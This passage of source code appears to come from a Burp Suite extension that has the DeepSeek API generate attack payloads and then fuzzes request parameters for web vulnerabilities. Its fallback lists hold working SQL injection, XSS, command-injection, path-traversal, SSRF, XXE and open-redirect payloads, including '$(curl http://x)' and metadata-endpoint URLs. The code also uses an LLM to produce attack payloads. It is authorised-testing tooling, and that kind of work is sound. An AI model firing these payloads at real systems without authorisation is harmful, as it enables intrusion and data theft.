    def BodyParsers__json_set(self, obj, dotted, new_val):
        parts = dotted.split('.'); cur=obj
        for i,p in enumerate(parts):
            is_last = (i==len(parts)-1)
            if isinstance(cur, list):
                idx=int(p)
                if is_last and idx < len(cur): cur[idx]=new_val
                elif idx < len(cur): cur=cur[idx]
                else: return obj
            elif isinstance(cur, dict):
                if is_last: cur[p]=new_val
                else: cur=cur.get(p, {})
            else:
                return obj
        return obj

    def start_smart_fuzzing(self, event):
        self.savePersistedSettings()
        if not self.generated_payloads: self.show_error("Generate payloads first"); return
        if not self.current_http_service: self.show_error("No HTTP service available. Capture a request from Burp first."); return
        if not self.parameter_list: self.show_error("No parameters detected in the request"); return
        try: delay_ms = int(self.delay_field.getText()); delay_ms = max(0, delay_ms)
        except Exception: delay_ms = 0

        self.is_fuzzing = True
        total_pl = len(self.generated_payloads); total_params = len(self.parameter_list)
        self.results_output.setText("Starting intelligent pentesting..\n" + "="*60 + "\n")
        self.results_output.append("Delay: {}ms\n".format(delay_ms))
        self.results_output.append("Sending {} payloads to {} parameters ({} total requests)\n".format(total_pl, total_params, total_pl*total_params))
        self.results_output.append("="*60 + "\n")

        def run_one(req_str):
            rb = None; status="N/A"; length=0; response_str=""; elapsed=0.0
            try:
                request_bytes = self._helpers.stringToBytes(req_str)
                t0 = time.time(); resp = self._callbacks.makeHttpRequest(self.current_http_service, request_bytes); elapsed = time.time() - t0
                rb = resp.getResponse(); response_str = self._helpers.bytesToString(rb) if rb else ""
                headers_list = []
                try:
                    analyzed_response = self._helpers.analyzeResponse(rb) if rb else None
                    if analyzed_response:
                        status = analyzed_response.getStatusCode() or status
                        headers_list = [str(h) for h in analyzed_response.getHeaders()]
                except: pass
                length = len(rb) if rb else 0
                return response_str, status, length, elapsed, headers_list, None
            except Exception as e:
                return "", status, 0, 0.0, [], str(e)

        def runner():
            total_requests = 0; strategy = self.strategy_combo.getSelectedItem()
            for param in self.parameter_list:
                baseline_req = self.current_request_template
                base_resp, base_status, base_len, base_time, base_headers, err = run_one(baseline_req)
                if err and self.verbose_chk.isSelected(): self.results_output.append("[BASELINE ERROR] {}\n".format(err))
                for payload in self.generated_payloads:
                    if not self.is_fuzzing: break
                    try:
                        # >>> pasamos strategy para controlar encoding solo en Open Redirect
                        fuzzed_request = self.inject_payload_into_parameter(self.current_request_template, payload, param, strategy)
                        response_str, status, length, elapsed, resp_headers, err = run_one(fuzzed_request)
                        if err and self.verbose_chk.isSelected(): self.results_output.append("Error sending request: {}\n".format(err))
                        detected, sev, conf, fp = self._analyze_with_scoring(base_resp, base_status, base_len, base_time, response_str, status, length, elapsed, payload, strategy, param, resp_headers)
                        vuln_label = detected if detected else "No vulnerability detected"
                        if detected and not self.finding_index.seen(detected, param['name'], param['location'], fp):
                            ev = self._short_evidence(response_str, payload)
                            if ev: vuln_label = "{} [{}|{}] | Evidence: {}".format(detected, sev, conf, ev)
                            self._metrics_inc_vuln_type(detected)
                            self.results_output.append("VULNERABILITY FOUND in {}[{}]: {}\n".format(param['name'], param['location'], vuln_label))
                            self.results_output.append("Status: {}, Length: {}, t={:.3f}s\n".format(status, length, max(0.0, elapsed - base_time)))
                            if self.verbose_chk.isSelected(): self.results_output.append("Payload: {}\n".format(payload))
                        # guarda
                        self.request_counter += 1
                        an_req = self._helpers.analyzeRequest(self.current_http_service, self._helpers.stringToBytes(fuzzed_request))
                        method = an_req.getMethod(); url = str(an_req.getUrl())
                        request_data = {"id": self.request_counter, "request": fuzzed_request, "response": response_str, "method": method, "url": url, "status": status, "length": length, "payload": "{}[{}]: {}".format(param['name'], param['location'], payload), "vulnerability": vuln_label}
                        self.all_requests.append(request_data); self.add_to_table(request_data)
                        total_requests += 1
                        if delay_ms > 0: time.sleep(delay_ms/1000.0)
                    except Exception as e:
                        if self.verbose_chk.isSelected(): self.results_output.append("Error sending request: {}\n".format(str(e)))
            self.results_output.append("="*60 + "\nPentesting completed\nTotal requests sent: {}\nVulnerabilities found: {}\nParameters tested: {}\nPayloads tested: {}\n".format(total_requests, self._count_findings_in_table(), len(self.parameter_list), len(self.generated_payloads)))
            self.is_fuzzing = False

        t = threading.Thread(target=runner); t.setDaemon(True); t.start()

    def _count_findings_in_table(self):
        cnt = 0
        for i in range(self.table_model.getRowCount()):
            v = self.table_model.getValueAt(i, 6)
            try: is_text = isinstance(v, basestring)
            except NameError: is_text = isinstance(v, str)
            if v and is_text and v.lower() not in ("no vulnerability detected", "n/a"): cnt += 1
        return cnt

    def stop_fuzzing(self, event):
        self.is_fuzzing = False; self.results_output.append("\nPentesting stopped\n")

    def _analyze_with_scoring(self, base_body, base_status, base_len, base_time, body, status, length, elapsed, payload, strategy, param, resp_headers=None):
        label = self.analyze_response(body, payload, strategy, elapsed, base_time, status, resp_headers)
        sev = "low"; conf = "low"; fp = ""
        if not body: 
            return ("No response", "low", "low", "empty")
        # señales diferenciales
        len_diff = 0 if not base_len else abs(length - base_len) / float(max(1, base_len))
        time_diff = max(0.0, elapsed - (base_time or 0.0))
        if "SQL Injection" in (label or "") or "NoSQL" in (label or ""): sev="high"; conf="medium"
        if "XSS" in (label or ""): sev="high"; conf="medium"
        if "SSRF" in (label or "") or "XXE" in (label or "") or "RCE" in (label or "") or "Command" in (label or ""): sev="critical"; conf="medium"
        if "Open Redirect" in (label or "") or "CORS" in (label or "") or "CRLF" in (label or "") or "Host Header" in (label or ""): sev="medium"; conf="medium"
        # bump por señales fuertes
        if "Evidence:" in (label or ""): conf="high"
        if time_diff >= 3.0: conf = "high" if "Time" in (label or "") else conf
        if len_diff >= 0.25 and "Suspicious" in (label or ""): conf="medium"
        fp = "{}|{}|{}|{}|{}".format(status, length, round(time_diff,3), (param.get('location')+":"+param.get('name')), (strategy or ""))
        return (label, sev, conf, fp)

    def analyze_response(self, response_str, payload, strategy, response_time=0, base_time=0, status=None, headers=None):
        if not response_str: return "No response"
        rl = response_str.lower(); pl = (payload or "").lower()
        headers = headers or []

        # --- Utilidades header ---
        def _hval(name):
            for h in headers:
                if h.lower().startswith(name.lower()+":"):
                    return h.split(":",1)[1].strip()
            return None
        def _is_external(target):
            try:
                host = (self.current_http_service.getHost() or "").lower()
                pu = urlparse(target)
                # absoluto
                if pu.scheme and pu.netloc:
                    return pu.netloc.split("@")[-1].split(":")[0].lower() != host
                # protocol-relative //evil.com
                if target.startswith("//"):
                    hostpart = target[2:].split("/",1)[0]
                    hostpart = hostpart.split("@")[-1].split(":")[0].lower()
                    return hostpart != host
                return False
            except:
                return False
        def _urldecode_once(s):
            try:
                return urllib.unquote(s)
            except:
                return s

        # ---------- OPEN REDIRECT ---------
        if "OPEN REDIRECT" in strategy.upper():
            # 3xx con Location
            try:
                code = int(status) if (status is not None) and (str(status).isdigit()) else -1
            except:
                code = -1
            if 300 <= code <= 399:
                loc = _hval("Location")
                if loc:
                    loc_raw = loc
                    loc_dec = self.html_decode(_urldecode_once(loc_raw))
                    checks = [loc_raw, loc_dec]
                    for candidate in checks:
                        cand_l = (candidate or "").strip()
                        if pl and pl in cand_l.lower():
                            return "Open Redirect - Location header points to payload"
                        if _is_external(cand_l):
                            return "Open Redirect - External Location: {}".format(candidate[:160])
                        if re.search(r'^[a-z]{2,10}:%2f%2f', cand_l, re.I) or cand_l.startswith("//") or "@" in cand_l or "\\" in cand_l:
                            if _is_external(cand_l.replace("\\","/")):
                                return "Open Redirect - Suspicious Location (encoded/obfuscated): {}".format(candidate[:160])

            # 200 con meta refresh / JS redirect
            meta = re.search(r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\']\s*\d+\s*;\s*url\s*=\s*([^"\']+)["\']', response_str, re.I)
            if meta:
                tgt = meta.group(1)
                tgt_dec = self.html_decode(_urldecode_once(tgt))
                if _is_external(tgt_dec) or (pl and pl in tgt_dec.lower()):
                    return "Open Redirect - Meta refresh to external/payload"
            js = re.search(r'\b(?:window\.)?location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', response_str, re.I)
            if js:
                tgt = js.group(1)
                tgt_dec = self.html_decode(_urldecode_once(tgt))
                if _is_external(tgt_dec) or (pl and pl in tgt_dec.lower()):
                    return "Open Redirect - JS redirect to external/payload"

        # --- SQL ---
        if "SQL" in strategy.upper():
            errors = ['you have an error in your sql','sql syntax','mysql_fetch','ora-','postgresql','sqlite','microsoft odbc','driver.*sql','unclosed.*string','warning.*sql','mysqli','pg_','plsql','sql server','sybase','db2','informix']
            for e in errors:
                if re.search(e, rl, re.IGNORECASE): return "SQL Injection - Database error detected"
            if response_time and base_time and (response_time - base_time) >= 3.0: return "SQL Injection - Time-based delay observed"

        # --- XSS ---
        if "XSS" in strategy.upper():
            if payload in response_str: 
                if re.search(r'<script[^>]*>.*?'+re.escape(payload)+r'.*?</script>', response_str, re.IGNORECASE|re.DOTALL):
                    return "XSS Reflected - In JS context"
                if re.search(r'=["\'].*?'+re.escape(payload)+r'.*?["\']', response_str, re.IGNORECASE):
                    return "XSS Reflected - In attribute context"
                if re.search(r'>[^<]*'+re.escape(payload)+r'[^<]*<', response_str, re.IGNORECASE):
                    return "XSS Reflected - In HTML text"
                return "XSS Reflected - Payload reflected"
            if any(x in rl for x in ['onerror=','onload=','<svg','javascript:alert(','<img','<script']):
                return "XSS Suspected - Dangerous sinks"

        # --- COMMAND/RCE ---
        if "COMMAND" in strategy.upper() or "RCE" in strategy.upper():
            ind = ['uid=','gid=','root:','www-data','command not found','bin/bash','bin/sh','cmd.exe','powershell','permission denied','/etc/passwd']
            if any(x in rl for x in ind): return "Command Injection/RCE - System command indicators"
            if response_time and base_time and (response_time - base_time) >= 3.0: return "RCE/CI - Time-based"

        # --- PATH/LFI ---
        if "PATH" in strategy.upper() or "LFI" in strategy.upper():
            lfi = ['root:x:','etc/passwd','boot.ini','windows/system32','proc/self/environ','etc/hosts','etc/shadow','directory listing']
            if any(x in rl for x in lfi): return "LFI/Path Traversal - File content detected"
            err = ['no such file','file not found','cannot open','permission denied']
            if any(x in rl for x in err): return "LFI/Path Traversal - File access error"

        # --- SSRF ---
        if "SSRF" in strategy.upper():
            ssrf = ['169.254.169.254','metadata.google.internal','169.254.170.2','localhost','127.0.0.1','connection refused','could not connect','reset by peer','internal server','invalid url','OpenSSH']
            if any(x in rl for x in ssrf): return "SSRF - Internal service response detected"

        # --- SSTI ---
        if "SSTI" in strategy.upper():
            if any(x in rl for x in ['jinja','twig','freemarker','velocity','thymeleaf','handlebars']):
                if any(s in response_str for s in ['49','34359738368','2401','49.0']): return "SSTI - Template evaluation indicators"
            if any(x in response_str for x in ['{{7*7}}','${7*7}','#{7*7}','*{7*7}','<%=${7*7}%>','${{7*7}}']): return "SSTI - Payload reflected"

        # --- XXE ---
        if "XXE" in strategy.upper():
            if any(x in rl for x in ['<!doctype','<!entity','external entity','system "file:///','system \'file:///']): return "XXE - External entity indicators"
            if any(x in rl for x in ['etc/passwd','root:x:','xml parser error','sgml parser error']): return "XXE - File leak / parser error"

        # --- NoSQL ---
        if "NOSQL" in strategy.upper():
            if any(x in rl for x in ['mongoerror','mongodb','bson','operationfailure','cast to objectid failed','invalid $','unknown operator: $']): return "NoSQL Injection - Database/operator error"

        # --- GraphQL ---
        if "GRAPHQL" in strategy.upper():
            if any(x in rl for x in ['graphql','introspection','__schema','__type','must provide query string','syntax error:','cannot query field']): return "GraphQL - Error/introspection indicators"

        # Diferencial simple con baseline general (cuando exista)
        if self._baseline_length > 0:
            try: current_length = len(response_str) if isinstance(response_str, (str, unicode)) else 0
            except: current_length = 0
            if current_length > 0 and abs(current_length - self._baseline_length) > self._baseline_length * 0.2:
                return "Suspicious - Significant length difference"

        # Errores genéricos
        for pattern, description in [(r'warning.*function','PHP Warning detected'),(r'notice.*function','PHP Notice detected'),(r'fatal error','Fatal error detected'),(r'undefined.*function','Undefined function'),(r'typeerror','TypeError detected'),(r'referenceerror','ReferenceError detected'),(r'syntaxerror','SyntaxError detected'),(r'stack trace','Stack trace detected'),(r'exception','Exception detected')]:
            if re.search(pattern, rl, re.IGNORECASE): return "Error detected - " + description

        return "No vulnerability detected"

    def _short_evidence(self, response_str, payload, context=60):
        try:
            if not response_str: return ""
            idx = response_str.find(payload)
            if idx != -1:
                start = max(0, idx - context//2); end = min(len(response_str), idx + len(payload) + context//2)
                return response_str[start:end].replace('\n', ' ')[:160]
            hints = ['sql','mysql','syntax','onerror','alert(1)','uid=','gid=','root:','etc/passwd','169.254.169.254','localhost','command not found','permission denied','file not found','stack trace','exception','__schema','graphql','mongo','bson','entity','<!doctype']
            for h in hints:
                i2 = response_str.lower().find(h.lower())
                if i2 != -1:
                    start = max(0, i2 - context//2); end = min(len(response_str), i2 + len(h) + context//2)
                    return response_str[start:end].replace('\n', ' ')[:160]
            return ""
        except: return ""

    def html_decode(self, text):
        try:
            import htmlentitydefs
            def entity_replacer(m):
                entity = m.group(1)
                if entity in htmlentitydefs.name2codepoint:
                    try: return unichr(htmlentitydefs.name2codepoint[entity])
                    except: return m.group(0)
                elif entity.startswith('#x') or entity.startswith('#X'):
                    try: return unichr(int(entity[2:], 16))
                    except: return m.group(0)
                elif entity.startswith('#'):
                    try: return unichr(int(entity[1:]))
                    except: return m.group(0)
                else: return m.group(0)
            return re.sub(r'&(#?[xX]?(?:[0-9a-fA-F]+|\w+));', entity_replacer, text)
        except: return text

    def add_to_table(self, request_data):
        def update_table():
            payload_short = request_data["payload"][:30] + "..." if len(request_data["payload"]) > 30 else request_data["payload"]
            vuln = (request_data.get("vulnerability") or "").strip()
            try:
                is_text = isinstance(vuln, basestring)
            except NameError:
                is_text = isinstance(vuln, str)
            if is_text and vuln.lower() in ("n/a", "no vulnerability detected"):
                vuln = "" 

            self.table_model.addRow([request_data["id"], request_data["method"], request_data["url"],
                                     request_data["status"], request_data["length"], payload_short, vuln])
        SwingUtilities.invokeLater(update_table)

    def call_deepseek_api(self, api_key, prompt):
        try:
            url = "https://api.deepseek.com/v1/chat/completions"
            data = {"model": "deepseek-chat", "messages": [{"role": "user", "content": prompt}], "temperature": 0.4, "max_tokens": 800}
            headers = {"Content-Type": "application/json", "Authorization": "Bearer " + api_key}
            req = urllib2.Request(url, json.dumps(data), headers); response = urllib2.urlopen(req); response_data = response.read()
            data = json.loads(response_data)
            if "choices" in data and len(data["choices"]) > 0:
                content = data["choices"][0]["message"]["content"]
                try: return content.encode('utf-8').decode('unicode_escape')
                except: return content
            else:
                return "API Error"
        except Exception as e:
            return "Error: " + str(e)

    def _extract_value_from_queryish(self, s):
        try:
            txt = (s or '').strip()
            m = re.search(r'(?:^|[?&])[^=&]{1,80}=\s*([^&#]+)', txt)
            if m:
                val = m.group(1)
                val = re.split(r'&', val, 1)[0]
                return val.strip()
            return txt
        except:
            return s

    def _is_destructive_sql(self, text):
        return re.search(
            r'\b(drop|delete|update|insert|truncate|alter|create|rename|grant|revoke)\b',
            text or '', re.IGNORECASE
        ) is not None

    # ---------- Payload generator ----------
    def generate_intelligent_payloads(self, api_key, request, strategy, custom_prompt, count):
        analyzed_request = self._helpers.analyzeRequest(self.current_http_service, self._helpers.stringToBytes(request))
        url = str(analyzed_request.getUrl()); method = analyzed_request.getMethod()
        
        parsed = urlparse(url)
        redacted_url = "{}://redacted.example{}".format(parsed.scheme, parsed.path or "/")
        try:
            param_names = ["{}[{}]".format(p.get("name",""), p.get("location","")) for p in (self.parameter_list or [])]
        except:
            param_names = []
        params_section = "Parameters: " + (", ".join(param_names) if param_names else "(none)")

        base_context = "Target URL: {}\nHTTP Method: {}\n{}\nAttack Type: {}\nNumber of Payloads: {}\n\n".format(
            redacted_url, method, params_section, strategy, count
        )
        if strategy == "CUSTOM PROMPT" and custom_prompt:
            prompt = base_context + custom_prompt + "\n\nGenerate [[COUNT]] payloads ONLY values, one per line."
        else:
            prompt = base_context + "Generate [[COUNT]] advanced {} payloads. Return ONLY payload values, one per line, no explanations.".format(strategy)
        prompt = prompt.replace('[[COUNT]]', str(count))
        try:
            raw = self.call_deepseek_api(api_key, prompt)
            lines = raw.split('\n') if raw else []
            payloads = []; seen=set()
            num_re = re.compile(r'^\s*(?:\d+[\.\)]\s*|\-\s*|\*\s*)?')
            for ln in lines:
                ln = (ln or '').strip()
                if not ln: continue
                ln = num_re.sub('', ln)
                ln = self._extract_value_from_queryish(ln)
                if (ln.startswith('"') and ln.endswith('"')) or (ln.startswith("'") and ln.endswith("'")):
                    ln = ln[1:-1].strip()

                low = (ln or '').lower()
                if low.startswith(('payload','example')):
                    continue
                if self._is_destructive_sql(ln):
                    continue

                if ln and ln not in seen:
                    seen.add(ln); payloads.append(ln)
                if len(payloads) >= count: break
            if len(payloads) < count:
                for p in self.get_fallback_payloads(strategy, count - len(payloads)):
                    if p not in seen:
                        seen.add(p); payloads.append(p)
                        if len(payloads) >= count: break
            return payloads[:count]
        except Exception as e:
            self._callbacks.printOutput("Error generating payloads: " + str(e))
            return self.get_fallback_payloads(strategy, count)

    def get_fallback_payloads(self, strategy, count):
        fallback_payloads = {
            "SQL Injection": ["' OR 1=1--","1' UNION SELECT NULL--","1' AND SLEEP(5)--","'/**/OR/**/1=1--","1' OR '1'='1'--"],
            "XSS": ["<script>alert(`1`)</script>","\" onmouseover=\"alert(1)","<img src=x onerror=alert(1)>","<svg onload=alert(`1`)>","javascript:alert(1)"],
            "Command Injection": [";id","|whoami","$(ls)","`id`","&& ping -c 5 127.0.0.1"],
            "Path Traversal": ["../../etc/passwd","..%2F..%2Fetc%2Fpasswd","..\\..\\windows\\system32\\drivers\\etc\\hosts","%00../../etc/passwd"],
            "LFI": ["../../etc/passwd","php://filter/convert.base64-encode/resource=index.php","..%2F..%2Fetc%2Fpasswd%00","/etc/passwd"],
            "SSRF": ["127.0.0.1:22","http://169.254.169.254/latest/meta-data/","file:///etc/passwd","http://localhost:22"],
            "RCE": [";phpinfo();","|python -c \"import os; os.system('id')\"","`whoami`","$(curl http://x)","{{7*7}}"],
            "SSTI": ["{{7*7}}","${7*7}","#{7*7}","*{7*7}"],
            "XXE": ["<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>","&xxe;"],
            "NoSQL Injection": ["{\"$ne\": null}","username[$ne]=x&password[$ne]=x","' || '1'=='1"],
            "GraphQL": ["{ __schema { types { name } } }","query q{ a:__typename b:__typename }"],
            "Open Redirect": ["https://evil.com","//evil.com","%2f%2fevil.com","///evil.com","https:%2f%2fevil.com","/\\evil.com","/%5cevil.com","/%2e%2e//evil.com","//evil.com/%2e%2e","https://evil.com@trusted.com","//trusted.com@evil.com"],
            "CRLF": ["%0d%0aInjected-Header: 1","\\r\\nX-Test: 1"],
            "CORS": ["https://evil.com","http://sub.evil.com","null"],
            "Host Header Injection": ["evil.com","evil.com:8080","attacker.evil.com"]
        }
        payloads = fallback_payloads.get(strategy, fallback_payloads["SQL Injection"] + fallback_payloads["XSS"])
        random.shuffle(payloads); return payloads[:count]

    # ---------- Historia / Burp listeners ----------
    def processHttpMessage(self, tool_flag, message_is_request, message_info):
        if not self.capture_traffic_chk.isSelected(): return
        if not message_is_request:
            try:
                request_bytes = message_info.getRequest(); request_str = self._helpers.bytesToString(request_bytes)
                if not request_str.startswith(('GET','POST','PUT','DELETE','HEAD')): return
                url_filter = self.url_filter_field.getText().strip()
                if url_filter:
                    analyzed_request_tmp = self._helpers.analyzeRequest(message_info.getHttpService(), request_bytes)
                    url_tmp = str(analyzed_request_tmp.getUrl())
                    if url_filter.lower() not in url_tmp.lower(): return
                response_bytes = message_info.getResponse(); response_str = self._helpers.bytesToString(response_bytes)
                if self._baseline_length < 0 and response_bytes: self._baseline_length = len(response_bytes)
                self.current_http_service = message_info.getHttpService(); self.current_request_bytes = request_bytes
                self.request_counter += 1
                analyzed_request = self._helpers.analyzeRequest(self.current_http_service, request_bytes)
                analyzed_response = self._helpers.analyzeResponse(response_bytes)
                status = "N/A"; length = 0
                try:
                    status = analyzed_response.getStatusCode(); length = len(response_bytes)
                    if not status or status == 0:
                        m = re.search(r'HTTP/\d\.\d\s+(\d{3})', response_str)
                        if m: status = int(m.group(1))
                except Exception:
                    m = re.search(r'HTTP/\d\.\d\s+(\d{3})', response_str)
                    if m: status = int(m.group(1))
                    length = len(response_bytes) if response_bytes else 0
                request_data = {"id": self.request_counter, "request": request_str, "response": response_str, "method": analyzed_request.getMethod(), "url": str(analyzed_request.getUrl()), "status": status, "length": length, "payload": "", "vulnerability": "N/A"}
                self.requests.append(request_data); self.all_requests.append(request_data); self.message_infos.append(message_info)
                self.add_to_table(request_data)
                if len(self.all_requests) == 1:
                    self.request_text_area.setText(request_str); self.response_text_area.setText(response_str); self.selected_request_data = request_data
            except Exception as e:
                self._callbacks.printError("Error: " + str(e))

    def createMenuItems(self, invocation):
        menu_items = ArrayList()
        if invocation.getSelectedMessages():
            message = invocation.getSelectedMessages()[0]
            request_str = self._helpers.bytesToString(message.getRequest())
            if request_str.startswith(('GET','POST','PUT','DELETE','HEAD')):
                item = JMenuItem("DeepSeek: Analyze Request")
                item.actionPerformed = lambda e, inv=invocation: self.context_menu_action(inv)
                menu_items.add(item)
        return menu_items

    def context_menu_action(self, invocation):
        messages = invocation.getSelectedMessages()
        if messages:
            message = messages[0]
            request_str = self._helpers.bytesToString(message.getRequest())
            response_str = self._helpers.bytesToString(message.getResponse())
            if request_str.startswith(('GET','POST','PUT','DELETE','HEAD')):
                try:
                    decoded_request = urllib.unquote(request_str); self.request_text_area.setText(decoded_request)
                except Exception:
                    self.request_text_area.setText(request_str)
                self.response_text_area.setText(response_str); self.tabbed_pane.setSelectedIndex(0)
                self.current_http_service = message.getHttpService(); self.current_request_bytes = message.getRequest()
                current_host = self.current_http_service.getHost(); current_port = self.current_http_service.getPort()
                current_proto = "HTTPS" if self.current_http_service.getProtocol() == "https" else "HTTP"
                self._callbacks.printOutput("HTTP service updated to: {}://{}:{}".format(current_proto, current_host, current_port))

    def display_selected_request(self):
        selected_row = self.request_table.getSelectedRow()
        if selected_row >= 0 and selected_row < len(self.all_requests):
            model_row = self.request_table.convertRowIndexToModel(selected_row)
            if 0 <= model_row < len(self.all_requests):
                self.selected_request_data = self.all_requests[model_row]
                try:
                    decoded_request = urllib.unquote(self.selected_request_data["request"]); self.request_text_area.setText(decoded_request)
                except Exception:
                    self.request_text_area.setText(self.selected_request_data["request"])
                self.response_text_area.setText(self.selected_request_data["response"])

    def send_to_repeater_from_ui(self, event):
        if not self.selected_request_data: self.show_error("Select a request from the history first"); return
        try:
            request_bytes = self._helpers.stringToBytes(self.selected_request_data["request"])
            self._callbacks.sendToRepeater(self.current_http_service.getHost(), self.current_http_service.getPort(), self.current_http_service.getProtocol() == "https", request_bytes, "DeepSeek AI - Request {}".format(self.selected_request_data["id"]))
            self._callbacks.printOutput("Request {} sent to Repeater".format(self.selected_request_data["id"]))
        except Exception as e:
            self._callbacks.printError("Error sending to Repeater: " + str(e))

    def build_intruder_set(self, event):
        if not self.current_request_template: self.show_error("Generate payloads first (Analyze & Generate)"); return
        if not self.parameter_list: self.show_error("No parameters detected in the request"); return
        param = self.parameter_list[0]; pname = param['name']; ploc = param['location']; marked = self._mark_parameter_with_sections(self.current_request_template, pname, ploc)
        try:
            req_bytes = self._helpers.stringToBytes(marked)
            self._callbacks.sendToIntruder(self.current_http_service.getHost(), self.current_http_service.getPort(), self.current_http_service.getProtocol() == "https", req_bytes, "DeepSeek AI - Intruder ({}[{}])".format(pname, ploc))
            self._callbacks.printOutput("Request with markers sent to Intruder for {}[{}]".format(pname, ploc))
        except Exception as e:
            self._callbacks.printError("Error sending to Intruder: " + str(e))
        try:
            clip = Toolkit.getDefaultToolkit().getSystemClipboard(); clip.setContents(StringSelection("\n".join(self.generated_payloads)), None)
        except Exception: pass
        choice = JOptionPane.showConfirmDialog(self.main_panel, "Payloads copied to clipboard.\nDo you want to save them to a file to load in Intruder?", "Payloads for Intruder", JOptionPane.YES_NO_OPTION)
        if choice == JOptionPane.YES_OPTION:
            chooser = JFileChooser(); chooser.setDialogTitle("Save payload list"); chooser.setSelectedFile(File("intruder_payloads.txt"))
            if chooser.showSaveDialog(self.main_panel) == JFileChooser.APPROVE_OPTION:
                try:
                    f = BufferedWriter(FileWriter(chooser.getSelectedFile()))
                    for p in self.generated_payloads: f.write(p); f.newLine()
                    f.close(); JOptionPane.showMessageDialog(self.main_panel, "Saved: " + chooser.getSelectedFile().getAbsolutePath())
                except Exception as e:
                    self.show_error("Error saving payloads: " + str(e))

    def _mark_parameter_with_sections(self, request_text, target_name, target_location):
        lines = request_text.split('\n'); new_lines = []; body_started = False; url_modified = False
        for i, line in enumerate(lines):
            if i == 0 and '?' in line and not url_modified:
                if target_location.upper() == 'GET':
                    parts = line.split('?', 1)
                    if len(parts) > 1:
                        url_part = parts[0]; query_string = parts[1].split(' ')[0]; http_part = parts[1][len(query_string):]
                        try: decoded = urllib.unquote(query_string)
                        except: decoded = query_string
                        new_params=[]
                        for p in decoded.split('&'):
                            if '=' in p:
                                k,v = p.split('=',1)
                                if k == target_name: new_params.append(k + '=%C2%A7' + urllib.quote(v) + '%C2%A7')
                                else: new_params.append(k + '=' + urllib.quote(v))
                            else: new_params.append(p)
                        new_lines.append(url_part + '?' + '&'.join(new_params) + http_part); url_modified = True; continue
                new_lines.append(line)
            elif line.strip() == '':
                body_started = True; new_lines.append(line)
            elif body_started:
                if target_location.upper() == 'POST' and '=' in line:
                    try: decoded = urllib.unquote(line)
                    except: decoded = line
                    new_params=[]
                    for p in decoded.split('&'):
                        if '=' in p:
                            k,v = p.split('=',1)
                            if k == target_name: new_params.append(k + '=%C2%A7' + urllib.quote(v) + '%C2%A7')
                            else: new_params.append(k + '=' + urllib.quote(v))
                        else: new_params.append(p)
                    new_lines.append('&'.join(new_params))
                else: new_lines.append(line)
            else: new_lines.append(line)
        return '\n'.join(new_lines)

    # ---------- Util ----------
    def show_error(self, message):
        JOptionPane.showMessageDialog(self.main_panel, message, "Error", JOptionPane.ERROR_MESSAGE)

    def getTabCaption(self): return "DeepSeek Pentest AI"
    def getUiComponent(self): return self.main_panel
